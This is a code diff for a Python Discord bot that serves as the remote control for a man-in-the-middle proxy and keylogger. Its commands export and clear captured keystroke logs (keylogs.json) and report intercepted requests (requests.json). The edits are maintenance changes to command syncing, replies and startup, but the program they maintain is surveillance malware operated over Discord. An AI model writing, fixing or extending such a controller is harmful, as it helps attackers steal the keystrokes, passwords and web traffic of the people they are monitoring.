@@ -4,22 +4,11 @@ from discord.ext import commands
 import json
 import os
 import threading
+import requests
 from datetime import datetime
 from colorama import Fore
 import sys
 import asyncio
-
-class ProxyBot(commands.Bot):
-    def __init__(self, webhook_url):
-        intents = discord.Intents.all()
-        super().__init__(command_prefix='/', intents=intents)
-        self.webhook_url = webhook_url
-        self.proxy_running = True
-        
-    async def setup_hook(self):
-        print(f"{Fore.YELLOW}[*] Syncing commands...{Fore.RESET}")
-        await self.tree.sync()
-        print(f"{Fore.GREEN}[+] Commands synced successfully{Fore.RESET}")
 
 class DiscordBot:
     def __init__(self, webhook_url, token):
@@ -32,6 +21,7 @@ class DiscordBot:
         # Initialize the bot with intents
         intents = discord.Intents.default()
         intents.message_content = True
+        intents.guilds = True
         self.bot = commands.Bot(command_prefix='/', intents=intents)
         
         # Setup commands
@@ -45,16 +35,17 @@ class DiscordBot:
     def setup_commands(self):
         @self.bot.event
         async def on_ready():
-            print(f"{Fore.GREEN}[+] Bot is ready as {self.bot.user.name}#{self.bot.user.discriminator}{Fore.RESET}")
+            print(f"{Fore.GREEN}[+] Bot is ready as {self.bot.user.name}{Fore.RESET}")
             try:
-                synced = await self.bot.tree.sync()
-                print(f"{Fore.GREEN}[+] Synced {len(synced)} command(s){Fore.RESET}")
+                # Force sync all commands
+                await self.bot.tree.sync()
+                print(f"{Fore.GREEN}[+] Commands synced successfully{Fore.RESET}")
             except Exception as e:
                 print(f"{Fore.RED}[!] Failed to sync commands: {e}{Fore.RESET}")
 
         @self.bot.tree.command(name="help", description="Display all available commands")
-        @app_commands.default_permissions()
         async def help(interaction: discord.Interaction):
+            await interaction.response.send_message("Help command received!")
             embed = discord.Embed(
                 title="🔧 MITM Proxy Commands",
                 description="Available commands for the proxy bot",
@@ -90,6 +81,7 @@ class DiscordBot:
 
         @self.bot.tree.command(name="exportkl", description="Export and clear keylogger data")
         async def exportkl(interaction: discord.Interaction):
+            await interaction.response.send_message("Export keylogger command received!")
             try:
                 with open('keylogs.json', 'r') as f:
                     data = json.load(f)
@@ -199,6 +191,7 @@ class DiscordBot:
 
         @self.bot.tree.command(name="status", description="Check proxy status")
         async def status(interaction: discord.Interaction):
+            await interaction.response.send_message("Status command received!")
             try:
                 with open('requests.json', 'r') as f:
                     requests_data = json.load(f)
@@ -244,7 +237,7 @@ class DiscordBot:
     def start(self):
         try:
             print(f"{Fore.YELLOW}[*] Starting Discord bot...{Fore.RESET}")
-            asyncio.run(self.bot.start(self.token))
+            self.bot.run(self.token)
         except Exception as e:
             print(f"{Fore.RED}[!] Bot error: {e}{Fore.RESET}")
 
